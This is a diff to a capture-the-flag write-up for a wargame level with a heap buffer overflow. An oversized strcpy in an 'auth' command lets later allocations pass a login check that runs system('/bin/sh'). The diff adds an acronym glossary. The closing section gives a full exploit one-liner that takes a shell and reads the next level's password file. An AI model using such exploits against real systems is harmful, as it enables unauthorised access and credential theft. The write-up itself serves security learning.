@@ -1,5 +1,5 @@
 ## Level 8 - Heap Buffer Overflow
-Binary has auth command that allocates 4 bytes but allows strcpy of 30+ bytes -> heap overflow. Condition checks *(auth + 0x20) != 0 for shell access.
+Heap buffer overflow — auth command allocates 4 bytes but strcpy writes 30+ bytes, overflowing to set *(auth+0x20) != 0 to pass the login check for shell access.
 
 ### Settings
 GCC stack protector support:            Enabled
@@ -32,6 +32,14 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 - 0x20 offset lands in third service allocation
 - Service name "s3" stored as non-zero bytes
 - system("/bin/sh") executes with level8 privileges
+
+### Acronyms
+ELF    Executable and Linkable Format      The standard binary format for executables, object files, and shared libraries on Linux/Unix systems
+SSH    Secure Shell                        A cryptographic network protocol for secure remote login and command execution over an unsecured network
+NX     No-eXecute                          A memory protection that marks regions (stack, heap) as non-executable, preventing shellcode from running directly in those regions
+ASLR   Address Space Layout Randomization  A kernel security feature that randomizes the base addresses of stack, heap, and libraries on each run to make addresses unpredictable
+RELRO  RELocation Read-Only                A hardening technique that marks the GOT read-only after startup, preventing GOT overwrites
+PIE    Position Independent Executable     A binary compiled to load at a random base address, making it compatible with ASLR for full address randomization
 
 ### Commands
 (echo "auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; echo "service s1"; echo "service s2"; echo "service s3"; echo "login"; sleep 1; echo "cat /home/user/level9/.pass"; sleep 1) | /home/user/level8/level8
